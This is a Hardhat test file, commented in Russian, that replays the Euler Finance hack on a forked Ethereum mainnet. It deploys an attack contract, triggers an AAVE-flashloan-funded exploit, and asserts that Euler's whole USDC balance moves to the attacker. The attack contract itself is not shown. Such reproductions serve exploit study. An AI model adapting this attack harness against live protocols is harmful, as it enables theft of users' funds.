import { loadFixture, ethers } from "./setup";
import { expect } from "chai";

describe("Euler Hack via AAVE flashloan - Forked Mainnet block (16_817_995)", function () {
  const usdcDecimals = 1000000n;

  const addressUSDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';  // Адрес контракта USDC на Ethereum mainnet
  const addressEuler = '0x27182842E098f60e3D576794A5bFFb0777E025d3';  // Адрес Euler на Ethereum mainnet
  const addressAAVE = '0xbcca60bb61934080951369a648fb03df4f96263c' // Адрес AAVE USDC Pool на Ethereum mainnet

  // Фикстура для деплоя контрактов
  async function deployContractsFixture() {
    const [owner] = await ethers.getSigners();
    const deployer = owner;

    // Загружаем контракт EulerHackUSDC
    const EulerHackUSDC = await ethers.getContractFactory("EulerHackUSDC");
    const eulerHack = await EulerHackUSDC.deploy();
    await eulerHack.waitForDeployment();

    // Создаем объект контракта USDC
    const usdc = await ethers.getContractAt("IERC20", addressUSDC);

    return { eulerHack, usdc, owner };
  }

  describe("Test flashloan", function () {
    it("Should execute the flashloan attack", async function () {
      const { eulerHack, usdc } = await loadFixture(deployContractsFixture);

      const AAVEFee = 189000000000n;

      // Получаем балансы USDC перед атакой
      console.log("------------------------------------------" )
      const eulerBalanceBefore = await usdc.balanceOf(addressEuler);
      console.log(`[beforeHack] | Euler balance перед эксплойтом: ${eulerBalanceBefore / usdcDecimals} USDC`);
      const eulerHackBalanceBefore = await usdc.balanceOf(eulerHack);
      console.log(`[beforeHack] | Баланс контракта атаки перед эксплойтом: ${eulerHackBalanceBefore / usdcDecimals} USDC`);
      const aaveBalanceBefore = await usdc.balanceOf(addressAAVE);
      console.log(`[beforeHack] | Баланс контракта AAVE перед эксплойтом: ${aaveBalanceBefore / usdcDecimals} USDC`);
      console.log("------------------------------------------" )

      // начинаем эксплойт
      const hackTx = await eulerHack.initiateAttack();
      await hackTx.wait();
      
      // Получаем балансы после атаки
      console.log("------------------------------------------" )
      const eulerBalanceAfter = await usdc.balanceOf(addressEuler);
      console.log(`[afterHack] | Euler balance после эксплойта: ${eulerBalanceAfter /usdcDecimals} USDC`);
      const eulerHackBalanceAfter = await usdc.balanceOf(eulerHack);
      console.log(`[afterHack] | Баланс контракта атаки после эксплойта: ${eulerHackBalanceAfter / usdcDecimals} USDC`);
      const aaveBalanceAfter = await usdc.balanceOf(addressAAVE);
      console.log(`[afterHack] | Баланс контракта AAVE после эксплойта: ${aaveBalanceAfter / usdcDecimals} USDC`);
      console.log("------------------------------------------" )

      // Делаем проверки что атака прошла успешно

      // Проверка изменения баланса контракта Euler (минус 34413863 USDC)
      await expect(hackTx).to.changeTokenBalance(
        usdc,
        addressEuler,
        -eulerBalanceBefore
      );

      // Проверка изменения баланса контракта атаки за вычетом комиссий AAVE
      await expect(hackTx).to.changeTokenBalance(
        usdc,
        eulerHack,
        eulerBalanceBefore - AAVEFee
      );

      // Проверка изменения баланса AAVE (+ комиссия)
      await expect(hackTx).to.changeTokenBalance(
        usdc,
        addressAAVE,
        AAVEFee 
      );
    });
  });
});
